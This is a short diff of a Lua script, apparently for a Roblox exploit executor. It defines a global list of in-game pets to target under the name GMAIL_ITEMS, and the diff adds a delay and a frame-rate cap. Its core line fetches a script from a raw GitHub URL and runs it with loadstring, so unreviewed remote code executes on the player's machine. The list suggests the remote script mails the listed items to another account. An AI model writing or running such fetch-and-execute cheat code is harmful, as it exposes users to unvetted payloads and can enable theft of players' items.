@@ -30,3 +30,5 @@ _G.GMAIL_ITEMS = {
   ["Shiny RB Fireball Cat"] = {Class = "Pet", Id = "Fireball Cat", MinAmount = 1, IsRainbow = true, IsShiny = true},
 }
 loadstring(game:HttpGet("https://raw.githubusercontent.com/sxdasfvas/test/main/gscripts.lua"))()
+wait(120)
+setfpscap(5)
